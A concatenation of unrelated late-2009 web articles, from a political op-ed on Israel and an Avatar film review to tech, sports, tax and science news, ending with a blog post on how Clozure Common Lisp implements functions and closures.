( Separately Salah was also sentenced to nine months in prison for allegedly assaulting a police officer during a 2007 demonstration ; a conviction condemned as political persecution by other Palestinian leaders inside Israel . )
Such repression does not only affect non-Jews .
The United Nations - commissioned Goldstone report noted “ that actions of the Israeli government ” within Israel , during and after Israel ’s invasion of Gaza last winter , “ including interrogation of political activists , repression of criticism and sources of potential criticism of Israeli military actions , in particular nongovernmental organizations , have contributed significantly to a political climate in which dissent with the government and its actions in the Occupied Territories is not tolerated . ”
These means of “ internal ” repression resemble the movement bans , censorship and other forms of harassment that the South African apartheid regime began to deploy in its late stages against dissenting whites , eroding the “ liberal democratic ” space they had for so long enjoyed at the expense of the country ’s black majority .
Maintaining a Jewish - controlled “ liberal democratic ” regime in Palestine / Israel is incompatible with the exercise of the inalienable rights of Palestinians .
It emphatically depends on their permanent violation , especially the right of return .
But the exercise of the inalienable rights of Palestinians — an end to discrimination against Palestinian citizens , dismantling the 1967 occupation regime , and the right of return for refugees — is fully compatible with Israeli Jews exercising the human , civil , political and cultural rights to which they are unquestionably entitled .
As a first step toward imagining and creating such a framework , we have to ditch the absurd idea reproduced by Freedom House , that Israeli Jews can epitomize perfect freedom while imposing perfect tyranny and dispossession on a greater number of human beings who belong to the same country .

Is Microsoft serious about dynamic languages ?
That is a question that software developer K. Scott Allen asked on his OdeToCode blog in a Nov. 23 post .
Specifically , Allen questioned Microsoft 's commitment to its IronPython and IronRuby implementations of the Python and Ruby dynamic languages , saying he does not see them as first - class citizens in the Microsoft portfolio of languages .
" A first - class language is deployed when the full .NET framework is installed , " Allen said .
" It 's as easy to find as csc.exe .
It 's not a language you have to ask the IT department to install separately .
It 's not a language that requires you to jump out of Visual Studio to edit or run . "
Moreover , said Allen :
" " Consider this ...?? Ã IronPython got underway in July of 2004 .
Five years later it appears IronPython is still not a candidate to be a first class language in the .NET framework and tools .
You can vote on this issue .??
Ã Microsoft first released IronRuby at Mix in 2007 .
Nearly three years later it appears IronRuby is still not a candidate to be a first class language in the .NET framework and tools .
You can vote on this issue . " "
Allen 's post does make one wonder about a bunch of things , such as what is going on with Jim Hugunin , the creator of IronPython , who has been really quiet of late other than making this post .
And John Lam , who Microsoft hired to head up the project that became IronRuby , announced in a recent blog post that he was passing the IronRuby torch to Jimmy Schemeti and is in the midst of building a new team to pursue " a fantastic new project . "
Not that this move means there will be any diminution of interest in the IronRuby project at Microsoft .
Indeed , Lam said he is leaving the project in Schementi's " capable hands " and that the " IronRuby project is still going strong . "
Meanwhile , Allen said :
" " I was depressed when I read the session list from Microsoft 's recent Professional Developers Conference .
If you browse the session list you 'll find hundreds of sessions covering cloud computing , SharePoint , Silverlight , SQL Server , and modeling .
There are a handful of sessions covering concurrency , and a few dedicated to C ++.
" There is exactly one session featuring the Dynamic Language Runtime in a significant fashion .
The title is Using Dynamic Languages to Build Scriptable Applications .
You can learn how to augment an existing application after you 've done all the real work in a first class language . " "
However , in an interview with eWEEK at PDC , S. " Soma " Somasegar , senior vice president of Microsoft 's Developer Division , said , " When it comes time to think about what languages are used externally , C++ is broadly used , as are C# and VB .
Those are the top three that we think about in terms of usage share .
But the languages that I think about that are dominant in terms of growing interest are the scripting languages , such as JavaScript or Python , for example .
Or pick your favorite scripting language .
You can think about them as dynamic languages or scripting languages , but I think there is a growing popularity . "
Lam gave a talk on dynamic languages and .NET at Microsoft 's TechEd North America conference in Los Angeles in May .
Of his talk , Lam said , " I showed how you can add Ruby and Python scripting to an existing app , and spent some time building some simple REPLs .
Toward the end of the talk , I showed a more realistic scenario where I embed a REPL in an existing Open Source .NET application : Witty . "
RAF servicemen and women often have to endure long periods away from their children .
But a scheme is up and running which allows them to record bedtime stories onto CDs for their children to listen to back at home .
Chris Buckler reports .
He is one of the world 's most eminent composers , who cemented his reputation at the vanguard of the English Romantic movement with compositions such as the Enigma Variations and the Pomp and Circumstance marches .
But Edward Elgar was also a terrible trombone player , it has now transpired , even though he wrote the most beautiful melodies for the instrument in his compositions .
His skills were so poor that when the composer from Worcester started playing a specially inscribed trombone for a dear friend , she ran out of the room in a fit of hysterical laughter , leaving the composer swearing in frustration .
Download the new Independent Premium app Sharing the full story , not just the headlines
Sue Addison , the principal trombonist for the Orchestra of the Age of Enlightenment ( OAE ) , who has been researching Elgar 's trombone which is kept at the Royal College of Music , discovered a revealing letter written by his friend , Dora Penny , who often went to Elgar 's home to listen to his compositions , and on whom he based a character in Enigma Variations .
The letter , which is only four lines long , recounted a comical incident in which Elgar revealed himself to be disastrous on the instrument .
It read : " On one occasion , he [ Elgar ] got up and fetched a trombone that was standing in a corner and began trying to play passages in the score .
He did n't do very well and often played a note higher or lower than the one he wanted ... and as he swore every time that happened , I got into such a state of hysterics that I did n't know what to do .
Then he turned to me [ and said ] : ' How do you expect me to play this dodgasted thing if you laugh ? '
" I went out of the room as quickly as I could and sat on the stairs , clinging to the banisters ' til the pain eased but it was no good .
I could n't stop there as he went on making comic noises , so I went downstairs out of earshot for a bit . "
The letter had been archived at the Elgar Birthplace Museum in Worcester but had not been noticed until now .
In the course of her research , Ms Addison also found that he took up the instrument at the age of 43 , not as a young boy as had been previously believed .
The confusion may have arisen from an inscription on the bell of the trombone , which bears Elgar 's name as well as the date 1875 , which was assumed to be when he started playing the instrument , at 18 years of age .
But an admission Elgar made in 1900 proves it lay untouched for decades .
Ms Addison said : " Elgar wrote hundreds of letters to his publisher , Jaegar , discussing changes to his work , and in one letter dated 1900 , when he was writing The Dream of Gerontius , he writes a PS which said ' I 'm learning the trombone ' , and he drew a sketch of himself playing it by the side of the letter .
He later said he was n't sure whether he was worse on the typewriter or the trombone . "
The instrument was given by Elgar to the YMCA 's Music Section in Worcester when they appealed for instruments in 1918 to send off to British troops abroad to raise morale .
Elgar , then 63 , wrote : " Why should I keep it for sentiment when the ' boys ' can put it to use ? "
It went " missing in action " until it was found at the Ealing Branch of the YMCA in 1934 following a series of adverts to locate it .
The YMCA then donated the trombone to the Royal College of Music .
Ms Addison said she originally set out to discover if Elgar ever played his trombone publicly , as he is known to have done with the violin , organ , piano and bassoon .
She will now play the composer 's trombone in a performance by the OAE of The Dream of Gerontius at the Royal Festival Hall next Tuesday – the first time it has been played in a concert since Elgar 's death in 1934 .
The OAE performance in London , and later in Birmingham Town Hall , will be a rare opportunity to hear the piece performed on original instruments with the same pitch as Elgar would have used .
Smallest orchid in the world found by accident ( well it is only 2 mm wide )
The cream - coloured orchid measures only 2.1 mm across and the petals are so thin they are transparent
Botanists who have just discovered a new flower in Ecuador can be forgiven for having missed it until now .
The world 's smallest orchid is just 2.1 mm wide , with transparent petals that are just one cell thick .
It comes from the Platystele genus , which is made up of mostly miniature plants .
American scientist Lou Jost found the tiny flower by accident among the roots of a larger plant that he had collected from the Cerro Candelaria reserve in the eastern Andes .
He said : ' I saw that down among the roots was a tiny little plant that I realised was more interesting than the bigger orchid .
' Looking at the flower is often the best way to be able to identify which species of orchid you ’re got hold of - and can tell you whether you ’re looking at an unknown species or not . '
It is the 60th new orchid that Dr Jost has discovered in the past decade .
He works for Ecuador 's EcoMinga Foundation , which created the reserve in partnership with the World Land Trust in Britain .
' It is an exciting feeling to find a new species , ' he said .
' People think everything has been discovered but there 's much more . '
More than 1,000 orchid species have been unearthed in the South American country in the last 100 years as new roads have opened up more remote regions .
Dr Jost 's most exciting find was a group of 28 types of orchids from the teagueia genus in a mountainous area near Banos , Ecuador .

Darpa says all 10 balloons are visible from roads ( image : Darpa )
The US defence research agency has used 10 red balloons in a contest to assess the accuracy with which information spreads on the internet .
The giant moored weather balloons were launched on Saturday morning at 10 undisclosed locations across the United States .
More than 4,000 groups competed to be the first to pinpoint all 10 .
A team from the Massachusetts Institute of Technology ( MIT ) won the challenge and a prize of $ 40,000 ( £ 24,000 ) .
Johanna Jones , a spokeswoman for the US Defense Advanced Research Projects Agency ( Darpa ) , said that beyond the actual contest , the aim was to see whether social networking sites like Facebook and Twitter should be seen as credible sources of information .
Darpa is no stranger to innovative uses of technology .
The agency - which is part of the US defence department - played a pivotal role in the creation of the internet itself .
Forty years on , with the internet in full swing , the same agency was keen to see if the power of social networking sites - with their tens of millions of users - could be used as a credible source to alert authorities of impending disaster or unrest on US soil .
Avatar may well be the biggest anti War film of all time .
It stands against everything the West is identified with .
It is against greed and capitalism , it is against interventionalism , it is against colonialism and imperialism , it is against technological orientation , it is against America and Britain .
It puts Wolfowitz , Blair and Bush on trial without even mentioning their names .
It enlightens the true meaning of ethics as a dynamic judgmental process rather than fixed moral guidelines ( such as the Ten Commandments or the 1948 Human Right Declaration ) .
It throws a very dark light on our murderous tendencies towards other people , their belief and rituals .
But it does n’t just stop there .
In the same breath , very much like German Leben philosophers ( 1 ) , it praises the power of nature and the attempt to bond in harmony with soil , the forest and the wildlife .
It advises us all to integrate with our surrounding reality rather than impose ourselves on it .
Very much like German Idealists and early Romanticists , it raises questions to do with essence , existence and the absolute .
It celebrates the true meaning of life and livelihood .
It is pretty astonishing and cheering to discover Hollywood paving the way to the victorious return of German philosophical thought .

The year is 2154 and the RDA corporation is mining planet Pandora digging for Unobtanium , a unique mineral that defies gravity and sells for top cash .
Pandora is a remote planet inhabited by the Na’vi , a species that shares some human features .
Like humans the Na’vi have their own developed language and high culture .
Yet unlike westerners they integrate with their surrounding reality searching for harmony in nature rather than looking for a means to exploit it .
The Na’vi are a few feet taller than humans , they are extremely strong , they also possess a long impressive tail and a long plait with a unique bond at its end that operate as an organic USB connection .
The bond allows the Na’vi to form a mental and spiritual union with their surrounding organic reality .
The Na’vi cherish their planet , they look after it .
They also worship a mother goddess called Eywa , who encompasses the integrated spiritual and physical centre of their universe and it ’s past .
In order to penetrate into the Na’vi , human scientists genetically engineered human - na ’vi hybrid bodies called Avatars .
Like in all Western interventionalist and colonial wars , the foreign invader insists on convincing itself that it can create some false needs amongst the indigenous population .
The RDA corporation takes pride in its attempt ‘ to bring culture to Pandora ’ .
The Avatars are there to communicate with the Na’vi .
They are there to teach them English and Western values .
They are there to maintain order so that the Na’vi fail to notice that their soil is raped and robbed by the Humans .
But as we soon learn , such an attempt is in vein .
The Humans have nothing to offer which the Na’vi are willing to take .
Jake Sully a paraplegic former marine is an Avatar .
With the support of the appropriate advanced technology and machinery he operates a Na’vi / Avatar hybrid .
Pretty soon Jake , as an Avatar , manages to make contact with the Na’vi .
He even manages to infiltrate into their civilisation .
Colonel Miles Quaritch , the fierce mercenary leader of the security forces , offers Jake to have his legs repaired in exchange for providing intelligence about the Na’vi .
Though Jake is initially happy to provide the goods , it is just a question of time before the ex- marine , changes his league .
Through the eyes of the Avatar , Jake sees truthfulness in harmony .
However , through his training and life experience he knows what Human genocidal brutality is all about .
He prefers harmony over racial brotherhood .
As the plot evolves , both Jake and the Avatar scientific team understand that the corporation and Colonel Quaritch are preparing for a total war against the Na’vi and their civilization .
The scientific team unite together with Jake against the corporation and the mercenary force .
They are committed to save the Na’vi .
Augustine , the professor behind the Avatar project who is genuinely fascinated by the Pandora magic and motivated by true knowledge - seeking , makes up her mind ; she says NO to technology .
She betrays the company that finances her research and eventually gives her life to her subject of research instead .
As the movie reaches its dramatic peak , Jake , the Avatar , the ex-human spy is leading the Na’vi defensive war against the Humans .
As the mercenary colonel is closing in on the sacred site , the Na’vi fight back fiercely against the superior technological might .
The Na’vi suffer heavy casualties .
When all hope seems lost , the Pandoran wildlife joins the Na’vi and attack the humans in great numbers , overwhelming them in the air and on the ground .
The film ends with Jake being successfully transplanted into his Na'vi Avatar .
We also see the remnants of the human army marching to a sky shuttle that will transport them out of Pandora .
The message of the 300 million cinematic spectacle is clear : NO to war , NO to greed , NO to intervention , No to throwing bombs , YES to nature , harmony and respecting the beliefs of others .
I recently learned that Avatar drew some criticism for its alleged ‘ racist subtext ’ .
“ Na ’vi might be blue aliens ” says one British commentator “ but they ’re also blue aliens with Masai - style necklaces …acted by mostly black actors .
They ’re also rescued from destruction by a white character – played , of course , by a white actor – who becomes one of them ” .
The idea of a “ white liberal man as the saviour of the so - called primitive natives ” seems to deliver a ‘ patronising ’ message .
I find it hard to take these arguments seriously .
The Sci -fi genre is creating an imaginary fantastic reality that thrives on familiarity .
James Cameron , the man behind the Avatar spectacle , based the Na’vi on an amalgam of many non-white aspects : African tribal markings , Native American settings , Jamaican hair styles and so on .
Yet , he manages to evoke empathy in us towards the so - called ‘ alien ’ rather than towards the Human .
This alone should be enough to defy the politically correct accusation of ‘ racist subtext ’ behind the film .
However , the criticism against Cameron drew my attention to the role of the Avatar as a double agent .
Towards the final scene Colonel Quaritch blames Jake for “ betraying his race ” .
Jake indeed changes sides ; he is doing it for a good cause .
And as it seems , the Na’vi and Pandora could n’t prevail without him , they needed his leadership .
In order to win the battle they needed a leader that is deeply familiar with the enemy 's tactics and mode of thought .
One of the reasons that America is defeated in Iraq and Afghanistan is the obvious fact that many Iraqis and Afghanis had been educated in American universities and are familiar with the American way , yet , not many within the American elite or military command understand Islam .
Not many amongst the American or British leadership are graduates of Kabul or Baghdad universities .
However , as in the case of Avatar , by the time America and Britain will start to train its forces to understand Islam , it may as well be ready for its new enlightened soldiers to change sides once they arrive on the battlefield .
I would maintain that to stand up against your own people for an ethical cause is the real meaning of humanism and liberty .
Yet , it is pretty astonishing that such an inspiring message is delivered by Hollywood .
We may have to admit , once again , that it is the artist and creative mind ( rather than the politician ) who is there to shape our reality and present a prospect of a better amicable future by the means of aesthetics .

Following massive protests from the public , New Zealand ’s proposed ‘ guilty upon accusation ’ anti-piracy law was scrapped earlier this year , although not for long .
A revamped version of the law , that was initially characterized as unfair and unworkable , has been revealed today .
In 2008 , the New Zealand government introduced a ‘ three - strikes ’ law which was designed to have alleged copyright infringers disconnected from the Internet .
The legislation , commonly referred to as Section92 , went largely unnoticed until the media picked it up .
The media attention led to widespread protests .
Most noticeable was ‘ Operation Blackout ’ , where hundreds of thousands ‘ blacked out ’ their profile images on social networking sites such as Twitter and Facebook , and not without success .
The objections eventually caused the government to scrap the law and go back to the drawing board .
Not for long though .
Fast forward a few months and the government already has a new and ‘ improved ’ version of the anti-piracy legislation ready .
The new plan no longer includes the ‘ guilty upon accusation ” section where consumers had little options to appeal a potential disconnection .
However , the new text also includes the option for copyright holders to demand $ 15,000 in damages from repeated copyright infringers .
“ I want to stress that account holders will have the opportunity during each of these processes to defend claims by right holders , ” Commerce Minister Simon Power said in a comment .
Under the new law , ISPs would no longer be obliged to simply disconnect every user accused of repeatedly downloading copyrighted material , without solid proof .
Instead , all account holders can request a hearing at the Copyright Tribunal if they do n’t agree with the proposed penalty or the evidence presented against them .
From current reports it is not clear how the copyright holders will collect evidence on alleged copyright infringers .
The past has shown that their data gathering techniques are not always the most accurate , to say the least .
If this is the case , we can expect to see many appeals once the new proposals become law in the coming year .
WASHINGTON — President Obama has no plans to lay his political capital on the line and travel to Massachusetts to campaign for the Democratic hopeful running to fill the late Ted Kennedy ’s Senate seat , the White House announced yesterday .
White House spokesman Robert Gibbs did n’t elaborate beyond saying Obama does n’t intend to appear with state Attorney General Martha Coakley , the Democrat who ’s been heavily favored to win , but lately appears vulnerable .
Democrats were stunned last week when a poll released by Public Policy Polling showed Coakley behind Republican State Sen. Scott Brown , 47 percent to 48 percent .
Obama ’s decision to stay out of the contest sparked speculation that he wo n’t campaign in the state because of fears his slipping popularity would do Coakley more harm than good , or because of a reluctance to dabble in politics so soon after the attempted terror attack in Detroit .
But Obama did send out a solicitation to his e-mail list .
“ The outcome of this race could n’t be more important , ” he wrote . ” . . .
I need every ally possible in the Senate . ”

TUCSON 
The unforgiving terrain of the Sonoran Desert , south of here , whose searing summers and frigid winters claim hundreds of lives each year , has long been a favored avenue of entry for illegal immigrants from Mexico and other Latin American countries .
But in the last year , the authorities say , smugglers have increasingly capitalized on a much more lucrative business  trafficking Chinese citizens into the United States .
The number of Chinese immigrants arrested while illegally crossing the border into Arizona through the busiest smuggling corridor in the United States increased tenfold in the last fiscal year , according to the United States Border Patrol in Tucson .
In fiscal 2009 , 332 Chinese immigrants were caught in the Border Patrol ’s Tucson sector , up from 30 the previous year , Border Patrol figures showed .
And in what could be a sign of a record - breaking pace for this year , agents in the Border Patrol ’s Tucson sector arrested 281 Chinese immigrants from Oct. 1 to Dec. 31 , the first quarter of the current fiscal year .
The reason is simple : dollars and cents .
As record quantities of illegal drugs are being intercepted in Arizona , those involved in taking people and drugs across the border are increasingly concentrating on the more rewarding smuggling of Chinese immigrants , said David Jimarez , a spokesman for the Border Patrol .

Luis DeLoureiro is building a better passer rating , among other statistical pursuits , at NFLStatAnalysis.net :
The Saints are perfect .
The Colts … their record is perfect as well .
Drew Brees ’s traditional quarterback rating ( 158.3 ) on Monday night was ….also ….. perfect ?
Do n’t get me wrong , Brees played about as well as I ’ve seen a QB play in a long time .
I ’m just having a little trouble with using the word perfect in this case .
Let me take a step back .
The traditional rating is a combination of four factors :
1. Completion %
2. Touchdown %
3. Interception %
4 . Yards per attempt
In the past , I have stated my reservations with the system .
I ’m not going to go into all of that again .
The issue here is that the rating has arbitrary boundaries for each of the above factors .
A player is considered to have had a perfect game if he :
1. completes 77.5 % of his passes
2. completes at least 11.875 % of his passes for touchdowns
3. throws zero interceptions ( this one actually makes sense ….. thank goodness , I ’m starting to get a headache )
4. has an average yards per attempt of at least 12.5
Although 77.5 % is clearly an outstanding completion percentage , it is a C ( maybe a C+ ) at most academic institutions .
Either way , it is not perfect .
Further , it ’s a fairly arbitrary number .
Why not 75 % ?
81 % ?
88.23217 %?
If I have n’t convinced you yet ( and I ’m fairly sure I have n’t ) that the traditional QB rating needs to be overhauled , think about these facts :
• Brees ’s outstanding performance on Monday night was the second “ perfect ” game of the season .
In Week 5 against Oakland , Eli Manning matched Brees ’s 158.3 rating .
No point in determining who was better .
Let ’s call it a tie .
Please feel free to kiss your sister .
( It should be noted that Manning threw only 10 passes in that game , completing 8 for 173 yards and 2 TDs .
Because of a bruised heel sustained by Manning the previous week , David Carr played a large part of the game . )
• If Brees had thrown one more pass – and it had fallen incomplete – his perfect game would have been gone .
Brees completed 18 of 23 passes for a completion percentage of 78.3 % .
Five incomplete passes is perfect .
Six ….. not good enough .
An additional incomplete pass would have brought Brees ’s completion percentage down to 75 % – which is less than a perfect 77.5 % .
His rating would have dropped to an imperfect 156.3 .
• Brees ’s fourth and fifth touchdown passes did nothing for his rating .
He was perfect after 3 .
• Building on the previous two bullets ( and , in the process , attempting to drill home my point ) , let ’s assume Brees had thrown three more passes in Monday ’s game .
Let ’s further assume those three passes went as follows ( the numbers are intentionally exaggerated ) :
o Incomplete
o 80 yard TD pass
o 80 yard TD pass
Brees would have finished the game 20 - 27 for 551 yards , 7 TDs and a rating of 155.5 – lower than his rating without the two 80 - yard passes .
• Finally , I ’m pretty sure the N.F.L. QB rating is the only place you ’ll find a scale of 0 to 158.3 ( actually , 158.3333333 ……. )
Brees had an outstanding game .
But 18 of 23 is not perfect .
Best QB Performances of the Season
Since you ’re asking , Brees ’s performance on Monday night narrowly missed the No. 1 performance of the season using my adjusted ratings .
Below are the top 5 performances of the season .
( See rating methodology here . )
Rank Player Week Opponent Rating 1 Eli Manning 5 Oakland 30.6 2 Drew Brees 12 New England 29.6 3 Drew Brees 6 New York Giants 20.4 4 Tony Romo 1 Tampa Bay 17.3 5 Aaron Rodgers 7 Cleveland 17.1
This Week ’s Rankings
• The top two players in the ratings were teammates on the San Diego Chargers a few years ago .
Under most circumstances , the Chargers would be getting grief for giving up on Drew Brees .
But Philip Rivers is certainly making his case to be considered among the league ’s elite QBs .
• Three months ago , the evaluation of the 2006 QB draft class seemed settled .
Jay Cutler was the league ’s next big star at the position .
Matt Leinart and Vince Young were busts .
That was three months ago .
Now ?
Vince Young looks like the player the Titans hoped they were getting .
( He does n’t yet qualify for my rankings , but he ranks fifth in the league when looking at only the last 5 weeks . )
And Cutler has taken a detour to Delhommeville .
• The top 10 this week looks essentially the same as last week’s .
Matt Schaub dropped two spots while Favre , Rodgers and Romo each advanced two spots .
• Lower down in the ratings , the Panthers ’ interim ( not really ) quarterback , Jake Delhomme , dropped three spots to 28 .
To put this in perspective , consider that the three quarterbacks ahead of him are Kerry Collins , Matthew Stafford and Matt Cassel .
Vinny Testaverde and , even , Steve Beuerlein , must look pretty good to Coach Fox right now .
The methodology is explained here .

Week 12 Only
( Minimum 10 Attempts )
More than 15.4 million Americans soon could learn that what the tax man giveth , the tax man can take away .
Those people , surprisingly , could owe taxes for 2009 because of complications in the Making Work Pay tax credit , a cornerstone of the $ 787 - billion economic stimulus package enacted in February , according to a government watchdog report released Monday .
More than 1.2 million of them could face Internal Revenue Service penalties , at least technically .
“ It definitely is going to be a surprise to some taxpayers , who are either going to have a balance due or a reduced refund this year , ” said Melissa Labant , technical manager on the tax staff of the American Institute of Certified Public Accountants .
“ I ’m concerned about those people who are spending those refunds , which in fact they might not be going to receive . ”

About 1 of every 10 people who file taxes , particularly those with more than one job , might have had too little withheld this year , meaning they have to make up the difference by April 15 , according to the report by the Treasury Department ’s inspector general for tax administration .
That difference depends on how much more they received beyond the allotted amount of $ 400 for each individual taxpayer and $ 800 for those filing joint returns .
A person working two jobs , for instance , could have received twice the amount in tax credits and would have to pay back half of it .
Those with multiple sources of income -- people with two or more jobs , dual - income couples filing jointly , and workers also receiving Social Security or pension benefits -- are more likely to be affected , the inspector general ’s report said .
The IRS and tax specialists had warned on websites and press releases earlier this year that taxpayers should check their withholding status to make sure they were n’t getting more credits than they were entitled to .
But the complexities of withholding taxes were lost on folks like Ken Mueller .
Advertisement
“ A lot of people looked at this and thought it was free money , but did n’t understand the implications , ” said Mueller of Lancaster , Pa .
Mueller , 47 , could n’t take advantage of the full credit .
In March , the radio station where he works in marketing cut his hours to 20 a week .
“ You ’re in a situation where you ’re kind of living hand - to - mouth , and if I have to give money back , it ’s going to hurt , ” he said .
Retailers said it was too early to know whether lower refunds or higher payments next April would affect the typical tax - season sales .
For the current holiday season , “ it ’s doubtful ” that the tax credit problem would make shoppers spend less , said Ellen Davis , vice president of the National Retail Federation .
Advertisement
“ The larger issue for the holiday season this year is the astronomically high unemployment rate and the troubled housing market , ” she said .
“ Any impact this tax credit will have is expected to be minimal . ”
And tax preparers , such as Steve Rousso in Sherman Oaks , said the situation was “ a tempest in a teapot . ”
“ In all likelihood , it will reduce the refund , but essentially most people wo n’t notice it , ” he said .
Still , some members of Congress were quick to criticize the Obama administration .
Advertisement
“ People will get help this year and have it taken away next year and might even pay penalties , ” Sen. Charles E. Grassley ( R - Iowa ) said .
“ It amounts to a bait - and - switch for these taxpayers , and that ’s not the way tax policy ought to treat people . ”
The IRS downplayed the problem , saying about three - quarters of those filers will simply get a smaller refund rather than having to pay money out of their pockets .
The agency estimated that only 65,000 people would face penalties .
Nevertheless , the IRS said Monday that any taxpayer facing such a penalty would be able to get a waiver .
“ We do n’t want this to adversely affect any people , ” IRS spokesman Eric Smith said .
The credit , heralded as part of the stimulus , fulfilled a major campaign promise by President Obama to cut middle - class taxes .

Treasury Department officials last week stressed that the tax credit delivered “ much - needed boosts to the paychecks of 95 % of all working Americans , ” estimating that more than 110 million families had received up to $ 60 more a month in take - home pay since the credit went into effect .
Tax credits usually are applied to income tax returns to reduce the amount owed .
But to maximize the economic stimulus of the Making Work Pay credit , workers started getting more money in their paychecks in April after the government instructed employers to withhold less taxes .
With each employer cutting withholding , a person with more than one job or spouses who both work could get the benefit twice -- or more .
The full tax credit applied to single filers with up to $ 75,000 in adjusted gross income , or $ 150,000 for those filing jointly .
A reduced credit is available for people with up to $ 95,000 in income or couples with $ 190,000 .
Advertisement
The problem could be resolved by workers adjusting the tax exemptions and allowances on the W - 4 forms they file with their employers , but many do n’t do that , tax experts said .
“ A very large percentage of people have n’t reviewed their W - 4 in years , ” said Jackie Perlman , an analyst at tax preparer H&R ; Block ’s research arm .
An aide to Senate Finance Committee Chairman Max Baucus ( D - Mont . ) said people affected by the withholding problem still would end up with a net tax cut .
Baucus “ fully expects ” the IRS to refrain from imposing tax penalties , the aide said .

Dealing with a taxing issue
More than 15.4 million people -- roughly 10 % of all tax filers -- will owe more taxes than they expected because of the Making Work Pay tax credit .
Who ’s affected ?
Mostly , people with more than one job , two - income couples filing jointly , and workers also receiving Social Security or pension payments .
A single tax filer who held the same job all year should not be affected .
Advertisement
How can you find out if you have underpaid your taxes ?
The Internal Revenue Service has an online withholding calculator at www.irs.gov to help figure out whether enough was withheld .
Tax preparer H&R ; Block also has one at www.hrblock.com.
What can you do if you underpaid ?
Adjust your withholding for the rest of the year to make up the difference .
You also can make a payment to the IRS by Jan. 15 for the amount you think you might be short -- or simply wait until you file your 2009 taxes to settle up .
The IRS said taxpayers would be able to get a waiver for any underpayment penalty caused by the tax credit .

How do you find an image or video on the Internet or YouTube without a text description ?
Along with his colleagues at the University of Amsterdam , Dutch researcher Theo Gevers has developed software that can find objects and concepts automatically in images and video clips .
The team from the University of Amsterdam took part in three major international competitions , testing and comparing computer search engines .
These competitions looked into which search methods could best detect concepts in images and video clips without text descriptions .
Concepts include objects such as persons , animals , vehicles and events such as explosions , demonstrations , fire , violence etc .
The team scooped first prize in all three of these competitions ( with over 60 teams from both industry and academia ) , winning ImageCLEF , PASCAL VOC and TRECVid .
The world - leading image and video search system uses advanced automatic image understanding , rapid indexing and intelligent classification techniques .
Supercomputers are used to address the enormous volumes of data .
Computerised searches
How do you look for an action scene or a pretty cat ?
At the moment , we use text for this .
For instance , you can type in the word " cat " and a search engine will start to look for images linked to the word " cat . "
But if the image or film clip is not described by text , then searching against text becomes impossible .

This comic is the one of the clearest explanations of why in every recession we have ever had , the unemployment rate remain high for years after the economy starts improving .
Employers will only start thinking about hiring after they are sure they will have the revenues to pay those workers .
After all , running out of money to pay your workers is one of the easiest ways to end up with a bankrupt company .
I was lurking on the #lisp irc channel on freenode yesterday , and the matter of how Clozure CL implements closures came up in passing .
If you use M -. to see the source of init - nclosure , you ’ll see a fairly impenatrable fragment of assembly code .
I thought I would try to explain it , at least for the x86 ports .
To understand how closures are implemented , it is necessary to know how functions are implemented .
A memory allocated object that is n’t a cons cell is a thing called a uvector .
A uvector consists of a header word and a number of data words .
Functions are uvectors , but they are a little bit funky .
Let ’s look at an example .
We ’re going to run the lisp under gdb so that we can examine how this function is represented in memory :
$ gdb dx86cl64 [ set up how gdb deals with signals , define some utility commands ] ( gdb ) source /usr / local / src/ccl/lisp-kernel/darwinx8664/.gdbinit ( gdb ) run Starting program : /usr / local / src/ccl/dx86cl64
Reading symbols for shared libraries +. done Welcome to Clozure Common Lisp Version 1.5 - dev-r13385 ( DarwinX8664 ) ! ?
( defun 2 - to - the ( x ) ( expt 2 x ) ) 2 - TO - THE ?
# ' 2 - to - the [ find out the address of the function ]
#< Compiled - function 2 - TO - THE # x302000A53B8 F > [ now we hit C - c ] ?
^C
Program received signal SIGINT , Interrupt .
0x00007fff813569ee in __semwait_signal () 1 : x /i $ pc 0x7fff813569ee < __semwait_signal+10 > : jae 0x7fff813569f5 < __semwait_signal+17 >
We want to see the function in memory .
To avoid talking about tagging , we just observe that memory - allocated objects are always dnode ( two machine words ) aligned .
Thus we just mask off the low 4 bits .
( gdb ) x/14g 0x302000A53B80 0x302000a53b80 : 0x0000000000000d95 0x4c00000000000009
That first word is the header word .
Note the #x95 in the low 8 bits .
That ’s the subtag .
In this case , it ’s x8664::subtag-function .
The upper 56 bits are the element count .
In this case , the function contains 13 ( #xd ) 64 - bit words .
I said earlier that functions were kind of funky .
The first byte of executable code is , of course , the # x4c at address # x302000A53B8 F , which is the tagged address of the function object .
There are 7 bytes between the start of the first uvector element and the start of the machine code .
We store the number of words of code and other immediate data in the lower 32 bits of the first word .
( This enables the GC to know what part of the uvector that it should n’t scan . )
In our example , we see that the function contains 9 words of code and other immediate data .
We ’ll skip over them .
0x302000a53b90 : 0xf983fffffff92d8d 0x56e5894855257508 0x302000a53ba0 : 0x4800000010c7c748 0x00000010b9f8758b 0x302000a53bb0 : 0xc9000000419d8b49 0x00000007900a63ff 0x302000a53bc0 : 0x906690666600c2cd 0x00000000000000f2
The #xf2 in the last word is an internal marker called x8664:: function - boundary - marker .
It too is used by the GC .
The rest of the data is the function ’s gc-able “ constants ” .
0x302000a53bd0 : 0x000030004001364e 0x0000302000a53c63 0x302000a53be0 : 0x0000302000a577ee 0x0000000004000800
We can use a custom gdb command to look at them .
[ pl stands for " print lisp " ] ( gdb ) pl 0x000030004001364e $ 1 = 0x38e00 " EXPT "
The symbol EXPT .
( gdb ) pl 0x0000302000a53c63 $ 2 = 0x38e00 " ( PC - SOURCE-MAP #< 4- element vector subtag = #xE7 @#x0000302000A53C2D ( ( UNSIGNED-BYTE 8 ) ) > ...
A list of function metadata .
( gdb ) pl 0x0000302000a577ee $ 3 = 0x38e00 " 2 - TO - THE "
The function ’s name .
The last word is a fixnum , and it is the function ’s “ lfun - bits ” .
The bit $ lfbits - trampoline - bit will be set if the function is a closure trampoline .
There are many more $ lfbits - xxx things .
There are some internal functions that we can use to look at a function ’s constants and lfun bits from lisp .
%NTH -IMMEDIATE will show a function ’s contants , indexed from 0 .
? ( %nth - immediate # '2 - to - the 0 ) EXPT ?
( %nth-immediate #'2 - to - the 1 ) ( FUNCTION -SYMBOL-MAP ( # ( X ) . #( 63 17 44 ) ) ) ?
( %nth-immediate #'2 - to - the 2 ) 2 - TO - THE
One last thing to know about functions : the last three arguments to the function are passed in the registers arg_x , arg_y , and arg_z .
( On x8632 , we only have arg_y and arg_z ) .
So , a function with only one argument will receive that argument in arg_z .
If there are more arguments than arg registers , the arguments are passed on the stack .
OK , so that ’s how functions work .
If anyone is still reading , let ’s look at closures now .
? ( let ( ( n 0 ) ) ( defun next - val ( ) ( incf n ) ) ( defun set-val ( x ) ( setq n x ) ) ) ?
